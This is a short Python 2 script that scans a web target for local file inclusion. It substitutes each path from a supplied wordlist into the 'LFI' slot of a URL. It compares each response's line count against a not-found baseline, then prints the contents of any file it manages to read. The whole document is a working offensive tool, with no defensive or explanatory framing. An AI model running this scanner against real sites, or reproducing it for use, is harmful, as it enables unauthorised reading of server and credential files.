#!/usr/bin/python

import requests, sys, re
from BeautifulSoup import BeautifulSoup
url = sys.argv[1]
r = requests.get(url + "/ea25495a-859a-44ae-a1d5-f1d6435d4ce5")
e = sum(1 for line in r.text.strip().split('\n'))

url = sys.argv[1]
file = open(sys.argv[2])

for l in file:
	if not l.startswith("#"):
		f = l.split(",")
		if len(f) == 1: f = [f[0].strip(),f[0]]
		try: 
			r = requests.get(url.replace('LFI', f[0]) )
			if e != sum(1 for line in r.text.strip().split('\n')): 
				print "\n\033[1;32m[+]\033[1;m \033[1;33m"+f[1].strip()+"\033[1;m"+" - "+r.url+"\n"
				print BeautifulSoup(re.sub("<br */? *>","\n",r.text),convertEntities=BeautifulSoup.HTML_ENTITIES).text.strip()
		except:
			pass
